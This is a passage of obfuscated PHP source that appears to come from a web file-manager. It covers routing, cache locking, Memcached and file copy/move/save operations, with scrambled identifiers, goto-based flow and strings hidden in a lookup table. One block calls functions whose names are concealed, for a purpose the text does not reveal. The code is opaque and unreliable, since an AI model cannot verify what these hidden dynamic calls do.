$AÖËÅï¥‚—); if (self::$halts) { return; } } } } $FÚŒê­ãÏÔ++; } } if ($EÄê†¶»äŠ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $FÏ¯‘¹ù =& $_SERVER[´¬]; header($_SERVER[$FÏ¯‘¹ù[1483]] . $FÏ¯‘¹ù[1484]); echo $FÏ¯‘¹ù[1485]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$E»äá¢¿¾[1477]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto EÃç°µÄ; DÆªÙÇ”Œ‡: $c½‹•ÌõÏò = array_keys(static::$patterns); $f²¼­²Ÿƒë = array_values(static::$patterns); $EÄê†¶»äŠ = !1; goto bÈ›¡‚‹°; BºÜ¼˜ìÀ×: $E»äá¢¿¾ =& $_SERVER[´¬]; $Dİ¾öˆŠÁø = parse_url($_SERVER[$E»äá¢¿¾[1477]], PHP_URL_PATH); $fæÙÊÓ†ˆò = $_SERVER[$E»äá¢¿¾[157]]; goto DÆªÙÇ”Œ‡; EÃç°µÄ: } } goto B²¬¦™’¯î; Dõ×éğá: class CacheLockDatabase { public function lock($FÖÚëƒËê, $f½µò§ä¯ = 0) { $e‰êîÊµ¾œ = Model($_SERVER[´¬][794]); $bÄÓ®å¼¤– = microtime(!0) + $f½µò§ä¯; while (microtime(!0) < $bÄÓ®å¼¤–) { $a°©î®ğ§ = $e‰êîÊµ¾œ->get($FÖÚëƒËê); if (!$a°©î®ğ§ || $a°©î®ğ§ < microtime(!0)) { $f„ö°Ş—® = $e‰êîÊµ¾œ->set($FÖÚëƒËê, $bÄÓ®å¼¤–); if ($f„ö°Ş—®) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C‚éĞÅ£à…) { return Model($_SERVER[´¬][794])->get($C‚éĞÅ£à…); } public function unlock($a°Æ‘Ü…À) { Model($_SERVER[´¬][794])->remove($a°Æ‘Ü…À); } } if ($_SERVER[$_SERVER[´¬][821]] != $_SERVER[$_SERVER[´¬][822]]) { goto bœ¹‘ßÉ…˜; C”ŞğÆÓá’: $aï®Æ‡¶êí($_SERVER[$_SERVER[´¬][828]]); goto F«ªµÈ·ğÑ; bœ¹‘ßÉ…˜: $DÊËÔÕˆ = $_SERVER[´¬][823]; $e¡Î¸áÅÈœ = $_SERVER[$_SERVER[´¬][824]] . $_SERVER[´¬][825]; $fœ¥¬…Á‚ = $DÊËÔÕˆ($e¡Î¸áÅÈœ); goto e×ˆäŠ”Äˆ; e×ˆäŠ”Äˆ: $F¢’¶¾¢ä = explode($_SERVER[´¬][228], $fœ¥¬…Á‚); if (count($F¢’¶¾¢ä) < $_SERVER[´¬][580]) { $FçËÈËš = $_SERVER[´¬][826]; $FçËÈËš(); } $aï®Æ‡¶êí = $_SERVER[´¬][827]; goto C”ŞğÆÓá’; F«ªµÈ·ğÑ: } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Dğ—Øƒ™³Û, $bç †­”•) { $dõ½ø£¹¼Ô =& $_SERVER[´¬]; if (!class_exists($dõ½ø£¹¼Ô[829])) { show_json($dõ½ø£¹¼Ô[830], !1); } $this->cacheTime = $bç †­”•; $this->handle = new Memcached(); if (is_array($Dğ—Øƒ™³Û[$dõ½ø£¹¼Ô[831]]) && count($Dğ—Øƒ™³Û[$dõ½ø£¹¼Ô[831]]) >= 1) { foreach ($Dğ—Øƒ™³Û[$dõ½ø£¹¼Ô[831]] as $e“›‡Ëé‘) { $cäŠ“¦ÁŒ = explode($dõ½ø£¹¼Ô[4], $e“›‡Ëé‘); $this->handle->addServer($cäŠ“¦ÁŒ[0], $cäŠ“¦ÁŒ[1]); } } else { $this->handle->addServer($Dğ—Øƒ™³Û[$dõ½ø£¹¼Ô[175]], $Dğ—Øƒ™³Û[$dõ½ø£¹¼Ô[176]]); } } public function set($cŸ¢–µ£ ‡, $d¼¾ÖÓÌ’, $A·ùÔÅŞä = false) { $A·ùÔÅŞä = $A·ùÔÅŞä ? $A·ùÔÅŞä : $this->cacheTime; return $this->handle->set($cŸ¢–µ£ ‡, $d¼¾ÖÓÌ’, $A·ùÔÅŞä); } public function get($c÷êìÕ´ù) { return $this->handle->get($c÷êìÕ´ù); } public function remove($E‘˜À¶§ãĞ) { return $this->handle->delete($E‘˜À¶§ãĞ); } public function deleteAll() { return $this->handle->flush(); } } goto Fœï·ãîƒÍ; bŠ´¡½¥¡¯: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($DÙª³Û»‰, $A¹Ğ˜‹‚) { goto cÚ§óğà®ò; cÚ§óğà®ò: $bäÏ‹ÙÒ˜‡ =& $_SERVER[´¬]; $aÑæµòÎŠ§ = $A¹Ğ˜‹‚; $GLOBALS[$bäÏ‹ÙÒ˜‡[1044]] = $bäÏ‹ÙÒ˜‡[1045] . $DÙª³Û»‰; goto a¡ÜÇÉ„ÒÌ; a¡ÜÇÉ„ÒÌ: Hook::trigger($bäÏ‹ÙÒ˜‡[1045] . $DÙª³Û»‰ . $bäÏ‹ÙÒ˜‡[1046], $aÑæµòÎŠ§); $fîñÈ‚±Ó· = self::driverMake($A¹Ğ˜‹‚[0]); if (method_exists($fîñÈ‚±Ó·, $DÙª³Û»‰)) { $B®Ö˜¿«° = @call_user_func_array(array($fîñÈ‚±Ó·, $DÙª³Û»‰), $A¹Ğ˜‹‚); } else { if (method_exists($fîñÈ‚±Ó·, $bäÏ‹ÙÒ˜‡[1047])) { $B®Ö˜¿«° = @call_user_func_array(array($fîñÈ‚±Ó·, $DÙª³Û»‰), $A¹Ğ˜‹‚); } else { if (method_exists(self, $DÙª³Û»‰)) { $B®Ö˜¿«° = @call_user_func_array(array(self, $DÙª³Û»‰), $A¹Ğ˜‹‚); } else { $B®Ö˜¿«° = call_user_func_array(array(parent, $DÙª³Û»‰), $A¹Ğ˜‹‚); } } } goto aªš˜Öµà; aªš˜Öµà: Hook::trigger($bäÏ‹ÙÒ˜‡[1045] . $DÙª³Û»‰ . $bäÏ‹ÙÒ˜‡[1048], $aÑæµòÎŠ§, $B®Ö˜¿«°); return $B®Ö˜¿«°; goto eäºßÁèŸ; eäºßÁèŸ: } public static function init($fñ¿â×ÖÒè) { return self::driverMake($fñ¿â×ÖÒè); } public static function copy($có›©Š¡Û¡, $A–Ø˜ô©½É, $c§æÜÖš›¯ = false, $BŠéƒóñ›ù = false) { return self::copyMoveStart($có›©Š¡Û¡, $A–Ø˜ô©½É, $c§æÜÖš›¯, $_SERVER[´¬][517], $BŠéƒóñ›ù); } public static function move($c‰ƒ Â÷ÑÛ, $BÓŠƒ•ÕêÛ, $FÄŞ¾Ï…·Â = false, $AïŞ†šÌ†Ü = false) { return self::copyMoveStart($c‰ƒ Â÷ÑÛ, $BÓŠƒ•ÕêÛ, $FÄŞ¾Ï…·Â, $_SERVER[´¬][519], $AïŞ†šÌ†Ü); } private static function copyMoveStart($f¦œğ¢ïÍ‘, $Cìšé±Òõê, $EÕªÚ»Œø, $cÚîÈ°ğĞÜ, $d“ÃãæˆÅ) { $bÉÄ¸‰ŠÊ =& $_SERVER[´¬]; $AŞ¼êõ‘‹Í = array($f¦œğ¢ïÍ‘, $Cìšé±Òõê, $EÕªÚ»Œø, $d“ÃãæˆÅ); Hook::trigger($bÉÄ¸‰ŠÊ[1045] . $cÚîÈ°ğĞÜ . $bÉÄ¸‰ŠÊ[1046], $AŞ¼êõ‘‹Í); $a†æ™¥ Å = self::copyMove($f¦œğ¢ïÍ‘, $Cìšé±Òõê, $EÕªÚ»Œø, $cÚîÈ°ğĞÜ, $d“ÃãæˆÅ); Hook::trigger($bÉÄ¸‰ŠÊ[1045] . $cÚîÈ°ğĞÜ . $bÉÄ¸‰ŠÊ[1048], $AŞ¼êõ‘‹Í, $a†æ™¥ Å); return $a†æ™¥ Å; } public static function saveFile($aŠ… «öÃÇ, $Aô¾Å¸å§Ì, $f›óåòñ˜ã = true) { goto c‚Š¤½ÃŞã; e‹’ğ”õ—®: $eŒñ•Œ‹³æ = self::driverMake($Aô¾Å¸å§Ì); $eêå ÛåÅ = !1; if ($eŒñ•Œ‹³æ->pathParse[$C›Š˜×åæ[1049]]) { $cëæÂœ£‡ = $eŒñ•Œ‹³æ->pathParse[$C›Š˜×åæ[1049]]; $eêå ÛåÅ = $eŒñ•Œ‹³æ; $eŒñ•Œ‹³æ = self::driverMake($cëæÂœ£‡); } goto F§ˆ˜ƒ®™“; c‚Š¤½ÃŞã: $C›Š˜×åæ =& $_SERVER[´¬]; $AâÎˆãóŠ† = self::info($Aô¾Å¸å§Ì); $eÌíÙàòÜ = self::driverMake($aŠ… «öÃÇ); goto e‹’ğ”õ—®; FÛµ¸´ëƒµ: $a¡°¤Î¬îğ = self::copyFile($eÌíÙàòÜ, $aŠ… «öÃÇ, $eŒñ•Œ‹³æ, $a›æÂ¥Ó»Ì, $AâÎˆãóŠ†[$C›Š˜×åæ[28]], $BÎ¶¯ìÀÏ÷); if ($eêå ÛåÅ) { $a¡°¤Î¬îğ = $eêå ÛåÅ->getPathOuter($a¡°¤Î¬îğ); } return $a¡°¤Î¬îğ; goto Eö‡‡Óó„ö; F§ˆ˜ƒ®™“: $a›æÂ¥Ó»Ì = $eŒñ•Œ‹³æ->pathFather($Aô¾Å¸å§Ì); $BÎ¶¯ìÀÏ÷ = !0; if (!$f›óåòñ˜ã && self::driverIsSame($eÌíÙàòÜ, $eŒñ•Œ‹³æ)) { $BÎ¶¯ìÀÏ÷ = !1; } goto FÛµ¸´ëƒµ; Eö‡‡Óó„ö: } private static function copyMove($aÌÜ®Ù‘§«, $C’•É¾â¾…, $D¬«¬õóñ±, $FÚ„´ÁŞ¶À, $cîÚºİáŠÜ = false) { goto E”íà…¥Öï; E”íà…¥Öï: $b›‹”Ä†µ¶ =& $_SERVER[´¬]; if (!$aÌÜ®Ù‘§« || $aÌÜ®Ù‘§« == $b›‹”Ä†µ¶[8] || !$C’•É¾â¾…) { return !1; } ignore_timeout(); goto B¹¿è—ª«; dÛİ«¡…ª”: if ($AÜÕß³ïÄÌ) { $f¼°á¹åÜ = $AÜÕß³ïÄÌ->getPathOuter($f¼°á¹åÜ); } return $f¼°á¹åÜ; goto aØ‘¶ÇªÃ–; a•ôöêå²å: Hook::trigger($b›‹”Ä†µ¶[73], $Aî¢µöÙ‘í, $aÌÜ®Ù‘§«, $f”ß÷ì¸­Ì, $C’•É¾â¾…); $BÃğá¿Ø¬ƒ = self::driverIsSame($Aî¢µöÙ‘í, $f”ß÷ì¸­Ì); if ($BÃğá¿Ø¬ƒ) { if ($FÚ„´ÁŞ¶À == $b›‹”Ä†µ¶[519] && !method_exists($f”ß÷ì¸­Ì, $b›‹”Ä†µ¶[1050]) && trim($C’•É¾â¾…, $b›‹”Ä†µ¶[8]) == trim($f”ß÷ì¸­Ì->pathFather($aÌÜ®Ù‘§«), $b›‹”Ä†µ¶[8])) { if ($Aî¢µöÙ‘í->pathThis($aÌÜ®Ù‘§«) != $cîÚºİáŠÜ && !$Aî¢µöÙ‘í->isTypeObject()) { return $Aî¢µöÙ‘í->rename($aÌÜ®Ù‘§«, $cîÚºİáŠÜ); } return $f”ß÷ì¸­Ì->getPathOuter($aÌÜ®Ù‘§«); } if (method_exists($f”ß÷ì¸­Ì, $FÚ„´ÁŞ¶À)) { return $f”ß÷ì¸­Ì->{$FÚ„´ÁŞ¶À}($aÌÜ®Ù‘§«, $C’•É¾â¾…, $D¬«¬õóñ±); } } goto cŒ‘Ğàœ‘‘; B¹¿è—ª«: $Aî¢µöÙ‘í = self::driverMake($aÌÜ®Ù‘§«); $f”ß÷ì¸­Ì = self::driverMake($C’•É¾â¾…); $C¯Áº„àŒ = $FÚ„´ÁŞ¶À == $b›‹”Ä†µ¶[519]; goto FË±©Œ¿‹¡; cŒ‘Ğàœ‘‘: $BñÇÍÓ×•‰ = $Aî¢µöÙ‘í->isFile($aÌÜ®Ù‘§«); if (!$BñÇÍÓ×•‰ && $f”ß÷ì¸­Ì->getType() == $b›‹”Ä†µ¶[718] && $Aî¢µöÙ‘í->getType() == $b›‹”Ä†µ¶[106]) { $f¼°á¹åÜ = $f”ß÷ì¸­Ì->copyFolderFromIO($Aî¢µöÙ‘í, $aÌÜ®Ù‘§«, $C’•É¾â¾…, $D¬«¬õóñ±, $C¯Áº„àŒ, $cîÚºİáŠÜ); } else { $f¼°á¹åÜ = self::copyPath($Aî¢µöÙ‘í, $aÌÜ®Ù‘§«, $f”ß÷ì¸­Ì, $C’•É¾â¾…, $D¬«¬õóñ±, $C¯Áº„àŒ, $BñÇÍÓ×•‰, $cîÚºİáŠÜ); } if ($f¼°á¹åÜ && $C¯Áº„àŒ) { $Aî¢µöÙ‘í->remove($aÌÜ®Ù‘§«); } goto dÛİ«¡…ª”; FË±©Œ¿‹¡: $AÜÕß³ïÄÌ = !1; if ($f”ß÷ì¸­Ì->pathParse[$b›‹”Ä†µ¶[1049]]) { $C’•É¾â¾… = $f”ß÷ì¸­Ì->pathParse[$b›‹”Ä†µ¶[1049]]; $AÜÕß³ïÄÌ = $f”ß÷ì¸­Ì; $f”ß÷ì¸­Ì = self::driverMake($C’•É¾â¾…); } self::check($Aî¢µöÙ‘í, $aÌÜ®Ù‘§«, $f”ß÷ì¸­Ì, $C’•É¾â¾…); goto a•ôöêå²å; aØ‘¶ÇªÃ–: } private static function check($Bå˜Šâã‡Œ, $aí˜¬Œ©ßº, $Aè»¹ÉÁ‡, &$EÙâ†¹Œ¦¢) { $dÏ¼ƒ—Š‘ =& $_SERVER[´¬]; if (self::driverIsSame($Bå˜Šâã‡Œ, $Aè»¹ÉÁ‡) && $Bå˜Šâã‡Œ->isFolder($aí˜¬Œ©ßº) && $Bå˜Šâã‡Œ->isParentOf($aí˜¬Œ©ßº, $EÙâ†¹Œ¦¢)) { show_json(LNG($dÏ¼ƒ—Š‘[1051]), !1); } if (!$Bå˜Šâã‡Œ->exist($aí˜¬Œ©ßº)) { show_json(LNG($dÏ¼ƒ—Š‘[105]), !1); } } private static function copyPath($F‰ª‰àÉØ, $cºÀÌ¯†«Ï, $D‚éˆçŞ“Û, $cê¸Àõ¬æà, $D¢ï¬âã¢÷, $c³Şî¿Ñëì, $B…íùë§ôˆ, $A›”µíÆ = false) { goto Cù¸–ˆĞ†ˆ; c¥ñ„ŠØï: if ($B…íùë§ôˆ) { return self::copyFile($F‰ª‰àÉØ, $cºÀÌ¯†«Ï, $D‚éˆçŞ“Û, $cê¸Àõ¬æà, $c¡¹¨Âó¶™, $c³Şî¿Ñëì); } if ($D¢ï¬âã¢÷ == REPEAT_RENAME_FOLDER) { $D¢ï¬âã¢÷ = !1; } $Aä‹Ø…£ô = rtrim($cê¸Àõ¬æà, $d…’·Ö¸ä[8]) . $d…’·Ö¸ä[8] . $c¡¹¨Âó¶™; goto F¼–»åÉ»‘; Cù¸–ˆĞ†ˆ: $d…’·Ö¸ä =& $_SERVER[´¬]; $c¡¹¨Âó¶™ = $A›”µíÆ ? $A›”µíÆ : $F‰ª‰àÉØ->pathThis($cºÀÌ¯†«Ï); if ($D¢ï¬âã¢÷) { $b¦‡îê¥‰ = $D‚éˆçŞ“Û->fileNameExist($cê¸Àõ¬æà, $c¡¹¨Âó¶™); $c¡¹¨Âó¶™ = $D‚éˆçŞ“Û->fileNameAuto($cê¸Àõ¬æà, $c¡¹¨Âó¶™, $D¢ï¬âã¢÷, !$B…íùë§ôˆ); $D¢ï¬âã¢÷ = $b¦‡îê¥‰ ? $D¢ï¬âã¢÷ : !1; } goto c¥ñ„ŠØï; F¼–»åÉ»‘: $eÃóÜ«Á…È = $D‚éˆçŞ“Û->mkdir($D‚éˆçŞ“Û->getPath($Aä‹Ø…£ô)); $cê¸Àõ¬æà = $D‚éˆçŞ“Û->getPathInner($eÃóÜ«Á…È); $d¶Õ¸éÌç = $F‰ª‰àÉØ->listPath($cºÀÌ¯†«Ï, !0); goto F»ÆßòÕÂ†; aõÔö÷æö°: self::copyMoveKeepInfo($F‰ª‰àÉØ, $cºÀÌ¯†«Ï, $eÃóÜ«Á…È); return $eÃóÜ«Á…È; goto A¿ŒĞõ»; F»ÆßòÕÂ†: $d¶Õ¸éÌç = is_array($d¶Õ¸éÌç) ? $d¶Õ¸éÌç : array($d…’·Ö¸ä[74] => array(), $d…’·Ö¸ä[75] => array()); $f¡×‰ƒ¥³£ = array_merge($d¶Õ¸éÌç[$d…’·Ö¸ä[74]], $d¶Õ¸éÌç[$d…’·Ö¸ä[75]]); foreach ($f¡×‰ƒ¥³£ as $D™ÜÂõ‹’) { $DÄô¿ÑÆ‹Ÿ = $D™ÜÂõ‹’[$d…’·Ö¸ä[29]] == $d…’·Ö¸ä[192]; $cºÀÌ¯†«Ï = $F‰ª‰àÉØ->getPathInner($D™ÜÂõ‹’[$d…’·Ö¸ä[76]]); $A·¥æÄ§ÜË = self::copyPath($F‰ª‰àÉØ, $cºÀÌ¯†«Ï, $D‚éˆçŞ“Û, $cê¸Àõ¬æà, $D¢ï¬âã¢÷, $c³Şî¿Ñëì, $DÄô¿ÑÆ‹Ÿ); if (!$A·¥æÄ§ÜË) { IO::errorTips($d…’·Ö¸ä[1052] . $cºÀÌ¯†«Ï . $d…’·Ö¸ä[67] . $cê¸Àõ¬æà); } } goto aõÔö÷æö°; A¿ŒĞõ»: } private static function copyFile($A­Öê³çÊÈ, $Böá±çùñ, $cå´  £‰ø, $c†ì°œƒŒ‹, $C‡Î²á´¶¹, $Aß§ù­£Õª) { goto B…˜çÎÖæ³; c† ´Ôšµè: mk_dir($DŞèŠØ‰ÈÁ); $Còô¥Ô±Ğ  = $DŞèŠØ‰ÈÁ . $Aß Ÿ‡‡†; $e¶ã¿™¸ó = $Còô¥Ô±Ğ ; goto E‰ÒÌ°¬Ä; B…˜çÎÖæ³: $dœÅÇ™»”£ =& $_SERVER[´¬]; $c†ì°œƒŒ‹ = $cå´  £‰ø->getPath(rtrim($c†ì°œƒŒ‹, $dœÅÇ™»”£[8]) . $dœÅÇ™»”£[8] . $C‡Î²á´¶¹); $Aß Ÿ‡‡† = $dœÅÇ™»”£[1053] . time() . rand_string(5); goto eÛ­µĞ¢Ùã; eŸšóÔë: return $Dœà§µ²ğ; goto Cğ¡óØÄøé; Eãîã”ŠËŒ: if ($GLOBALS[$dœÅÇ™»”£[6]][$dœÅÇ™»”£[88]][$dœÅÇ™»”£[760]]) { $c…·÷¬Öš„ = $GLOBALS[$dœÅÇ™»”£[6]][$dœÅÇ™»”£[88]][$dœÅÇ™»”£[760]]; } $Aß§ù­£Õª = !0; $DŞèŠØ‰ÈÁ = $c…·÷¬Öš„; goto c† ´Ôšµè; eÛ­µĞ¢Ùã: Hook::trigger($dœÅÇ™»”£[1054], $A­Öê³çÊÈ, $Böá±çùñ, $cå´  £‰ø, $c†ì°œƒŒ‹, $C‡Î²á´¶¹, $Aß Ÿ‡‡†); if (self::driverIsSame($A­Öê³çÊÈ, $cå´  £‰ø)) { if ($Aß§ù­£Õª) { $Dœà§µ²ğ = $cå´  £‰ø->moveFile($Böá±çùñ, $c†ì°œƒŒ‹); } else { $Dœà§µ²ğ = $cå´  £‰ø->copyFile($Böá±çùñ, $c†ì°œƒŒ‹); } Hook::trigger($dœÅÇ™»”£[1055], $A­Öê³çÊÈ, $Böá±çùñ, $cå´  £‰ø, $c†ì°œƒŒ‹, $C‡Î²á´¶¹, $Dœà§µ²ğ); self::copyMoveKeepInfo($A­Öê³çÊÈ, $Böá±çùñ, $Dœà§µ²ğ); return $Dœà§µ²ğ; } $c…·÷¬Öš„ = TEMP_FILES; goto Eãîã”ŠËŒ; E‰ÒÌ°¬Ä: $Còô¥Ô±Ğ  = $A­Öê³çÊÈ->download($Böá±çùñ, $Còô¥Ô±Ğ ); $Còô¥Ô±Ğ  = $A­Öê³çÊÈ->iconvApp($Còô¥Ô±Ğ ); $Dœà§µ²ğ = $cå´  £‰ø->upload($c†ì°œƒŒ‹, $Còô¥Ô±Ğ , $Aß§ù­£Õª); goto a’‰×¯½­; a’‰×¯½­: self::remove($e¶ã¿™¸ó); Hook::trigger($dœÅÇ™»”£[1055], $A­Öê³çÊÈ, $Böá±çùñ, $cå´  £‰ø, $c†ì°œƒŒ‹, $C‡Î²á´¶¹, $Dœà§µ²ğ); self::copyMoveKeepInfo($A­Öê³çÊÈ, $Böá±çùñ, $Dœà§µ²ğ); goto eŸšóÔë; Cğ¡óØÄøé: } private static function copyMoveKeepInfo($bŒÊÅˆÔ¹, $A°Ë°¿ÃìÁ, $FùËÓ²Ûå) { if (!$FùËÓ²Ûå) { return; } $D‰Ò³ƒ®ë™ = $bŒÊÅˆÔ¹->info($A°Ë°¿ÃìÁ); if (!is_array($D‰Ò³ƒ®ë™)) { return; } IO::setModifyTime($FùËÓ²Ûå, $D‰Ò³ƒ®ë™[$_SERVER[´¬][84]]); } public static function pathFather($BÜ½ŠÄÜ) { $B×šãÁôŠÇ = IO::init($BÜ½ŠÄÜ); $e†Àœî¦«á = $B×šãÁôŠÇ->pathFather($B×šãÁôŠÇ->path); return $B×šãÁôŠÇ->getPathOuter($e†Àœî¦«á); } public static function fileOut($aäØ´Çá¯ã, $EÏË»ãùÎ = false, $Aùƒ›¦ÂŒ = false, $Eİ‡©¦ˆ® = '') { $DŒôÛ‚ùÄ = self::driverMake($aäØ´Çá¯ã); if ($DŒôÛ‚ùÄ->isFileOutServer()) { return $DŒôÛ‚ùÄ->fileOutServer($aäØ´Çá¯ã, $EÏË»ãùÎ, $Aùƒ›¦ÂŒ, $Eİ‡©¦ˆ®); } return $DŒôÛ‚ùÄ->fileOut($aäØ´Çá¯ã, $EÏË»ãùÎ, $Aùƒ›¦ÂŒ, $Eİ‡©¦ˆ®); } public static function fileOutImage($AÏÑ™´ŸÕì, $dğ¸¯»³” = 250) { $d¼ŒÖ»ÜÀ³ = array(250, 600, 1200, 3000, 5000); for ($b¹Â¹Ö”­æ = 0; $b¹Â¹Ö”­æ < count($d¼ŒÖ»ÜÀ³); $b¹Â¹Ö”­æ++) { if ($b¹Â¹Ö”­æ == 0 && $dğ¸¯»³” <= $d¼ŒÖ»ÜÀ³[$b¹Â¹Ö”­æ]) { $dğ¸¯»³” = $d¼ŒÖ»ÜÀ³[$b¹Â¹Ö”­æ]; break; } else { if ($dğ¸¯»³” > $d¼ŒÖ»ÜÀ³[$b¹Â¹Ö”­æ - 1] && $dğ¸¯»³” <= $d¼ŒÖ»ÜÀ³[$b¹Â¹Ö”­æ]) { $dğ¸¯»³” = $d¼ŒÖ»ÜÀ³[$b¹Â¹Ö”­æ]; break; } else { if ($b¹Â¹Ö”­æ == count($d¼ŒÖ»ÜÀ³) - 1 && $dğ¸¯»³” > $d¼ŒÖ»ÜÀ³[$b¹Â¹Ö”­æ]) { $dğ¸¯»³” = $d¼ŒÖ»ÜÀ³[$b¹Â¹Ö”­æ]; break; } } } } $b§Ë®‹“Ä = self::driverMake($AÏÑ™´ŸÕì); if ($b§Ë®‹“Ä->isFileOutServer()) { return $b§Ë®‹“Ä->fileOutImageServer($AÏÑ™´ŸÕì, $dğ¸¯»³”); } return $b§Ë®‹“Ä->fileOutImage($AÏÑ™´ŸÕì, $dğ¸¯»³”); } private static function driverIsSame($a°ƒŠàéôÓ, $eÛ¤»šİ”) { goto Bì‡ÂŠƒ§; a»ßø±Ù‚¤: if ($a°ƒŠàéôÓ->pathDriver == $eÛ¤»šİ”->pathDriver) { return !0; } return !1; goto a¨¦äìñ Â; AÙ¥˜Ûš¤: if ($eªØñ­’µÂ != $dİ¡’‡‚¾) { return !1; } if ($eªØñ­’µÂ == $Bª‚¥â»Õ[718]) { return !0; } if ($eªØñ­’µÂ == $Bª‚¥â»Õ[106]) { return !0; } goto a»ßø±Ù‚¤; Bì‡ÂŠƒ§: $Bª‚¥â»Õ =& $_SERVER[´¬]; $eªØñ­’µÂ = $a°ƒŠàéôÓ->getType(); $dİ¡’‡‚¾ = $eÛ¤»šİ”->getType(); goto AÙ¥˜Ûš¤; a¨¦äìñ Â: } public static function copyUpdate($f˜Ãİµ‘®Õ, $bã¹¯ë±İ) { goto cƒ‘Ó¥Ã; B¼é×‡ô´: Hook::trigger($C¸·Íî¶ßæ[1059], $f˜Ãİµ‘®Õ, $bã¹¯ë±İ, $F£ÚÒÈ¾á); foreach ($ağ§®¥¬Çè as $BÅª»Í©¥á) { IO::mkdir($BÅª»Í©¥á); } foreach ($AØÈ»°°¥æ as $BÅª»Í©¥á) { IO::copy($BÅª»Í©¥á[$C¸·Íî¶ßæ[1056]], $BÅª»Í©¥á[$C¸·Íî¶ßæ[1057]], REPEAT_REPLACE); } goto fÑ‘ˆğ»Òµ; aóÏĞÕôŠá: $E‚ÇŠåÆÚ¡ = self::_listAll($f˜Ãİµ‘®Õ); $e¡åíµ¼å = self::_listAll($bã¹¯ë±İ); $AØÈ»°°¥æ = array(); goto B»™æ›¥†»; B»™æ›¥†»: $ağ§®¥¬Çè = array(); foreach ($E‚ÇŠåÆÚ¡ as $AëõìİÜ–ä => $BÅª»Í©¥á) { if (isset($e¡åíµ¼å[$AëõìİÜ–ä])) { if ($BÅª»Í©¥á[$C¸·Íî¶ßæ[77]] == 1) { continue; } if ($e¡åíµ¼å[$AëõìİÜ–ä][$C¸·Íî¶ßæ[78]] == $BÅª»Í©¥á[$C¸·Íî¶ßæ[78]]) { continue; } } if ($BÅª»Í©¥á[$C¸·Íî¶ßæ[77]] == 1) { $ağ§®¥¬Çè[] = $bã¹¯ë±İ . $C¸·Íî¶ßæ[8] . $AëõìİÜ–ä; continue; } $DÁÔƒØÉçƒ = strstr(trim($AëõìİÜ–ä, $C¸·Íî¶ßæ[8]), $C¸·Íî¶ßæ[8]) ? get_path_father($AëõìİÜ–ä) : $C¸·Íî¶ßæ[33]; $AØÈ»°°¥æ[] = array($C¸·Íî¶ßæ[1056] => $BÅª»Í©¥á[$C¸·Íî¶ßæ[76]], $C¸·Íî¶ßæ[1057] => rtrim($bã¹¯ë±İ, $C¸·Íî¶ßæ[8]) . $C¸·Íî¶ßæ[8] . $DÁÔƒØÉçƒ, $C¸·Íî¶ßæ[1058] => $BÅª»Í©¥á); } $F£ÚÒÈ¾á = array($C¸·Íî¶ßæ[192] => $AØÈ»°°¥æ, $C¸·Íî¶ßæ[77] => $ağ§®¥¬Çè); goto B¼é×‡ô´; cƒ‘Ó¥Ã: $C¸·Íî¶ßæ =& $_SERVER[´¬]; if (!IO::exist($f˜Ãİµ‘®Õ)) { return !1; } if (!IO::exist($bã¹¯ë±İ)) { IO::mkdir($bã¹¯ë±İ); } goto aóÏĞÕôŠá; fÑ‘ˆğ»Òµ: } private static function _listAll($cÙõÔÑ‰çÖ) { $A‡¾ÕºÏ¥Š =& $_SERVER[´¬]; $cÙõÔÑ‰çÖ = KodIO::clear($cÙõÔÑ‰çÖ); $cå¥ÌªÉ£ = IO::listAll($cÙõÔÑ‰çÖ); foreach ($cå¥ÌªÉ£ as &$fñÈ¥¦é—Œ) { $bæä§Œê‰Ù = substr($fñÈ¥¦é—Œ[$A‡¾ÕºÏ¥Š[76]], strlen($cÙõÔÑ‰çÖ)); $fñÈ¥¦é—Œ[$A‡¾ÕºÏ¥Š[1060]] = trim($bæä§Œê‰Ù, $A‡¾ÕºÏ¥Š[8]); } unset($fñÈ¥¦é—Œ); return array_to_keyvalue($cå¥ÌªÉ£, $A‡¾ÕºÏ¥Š[1060]); } public static function fileSubstr($C‰¢®¤êÙ›, $F‚à¤·ç‘‹, $FŠÎß»éé = false) { goto bÛ¦Ì ‘×³; Cˆ‘‘çŒƒÇ: $d’à³°»İ = $F‚à¤·ç‘‹; $eá¨Ù±„‚ = $FŠÎß»éé; if ($F‚à¤·ç‘‹ < 0) { $F‚à¤·ç‘‹ = $Dê±Å¡ŞÔÃ + $F‚à¤·ç‘‹; } goto e¹›ŒİÏ‘; fİ‘Â¢ùàÕ: if (!$e“…èÁóš® && $FŠÎß»éé && isset($GLOBALS[$c½ç°†§”[1063]])) { throw new Exception($GLOBALS[$c½ç°†§”[1063]][$c½ç°†§”[1064]]); } return $e“…èÁóš®; goto EÈöä—ø…; D‹‰âæí: if ($FŠÎß»éé <= 0) { return $c½ç°†§”[33]; } if ($F‚à¤·ç‘‹ < 0 || $F‚à¤·ç‘‹ >= $Dê±Å¡ŞÔÃ || $FŠÎß»éé > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\145\122\x65\141\144\40\145\162\162\157\x72\41\x20\163\164\x61\162\x74\x3d{$F‚à¤·ç‘‹}\73\154\145\x6e\147\164\x68\x3d{$FŠÎß»éé}\x3b\40\163\x69\172\x65\x3d{$Dê±Å¡ŞÔÃ}\73"); } $e“…èÁóš® = $C¥³½Šğë->fileSubstr($C‰¢®¤êÙ›, $F‚à¤·ç‘‹, $FŠÎß»éé); goto fİ‘Â¢ùàÕ; e¹›ŒİÏ‘: if ($FŠÎß»éé === !1) { $FŠÎß»éé = $Dê±Å¡ŞÔÃ - $F‚à¤·ç‘‹; } if ($F‚à¤·ç‘‹ + $FŠÎß»éé > $Dê±Å¡ŞÔÃ) { $FŠÎß»éé = $Dê±Å¡ŞÔÃ - $F‚à¤·ç‘‹; } if (!$Dê±Å¡ŞÔÃ && $C¥³½Šğë->getType() == $c½ç°†§”[106] && !$C¥³½Šğë->exist($C‰¢®¤êÙ›)) { throw new Exception($c½ç°†§”[1061] . LNG($c½ç°†§”[1062]) . $c½ç°†§”[925] . get_path_this($C‰¢®¤êÙ›) . $c½ç°†§”[33]); } goto D‹‰âæí; bÛ¦Ì ‘×³: $c½ç°†§” =& $_SERVER[´¬]; $C¥³½Šğë = self::driverMake($C‰¢®¤êÙ›); 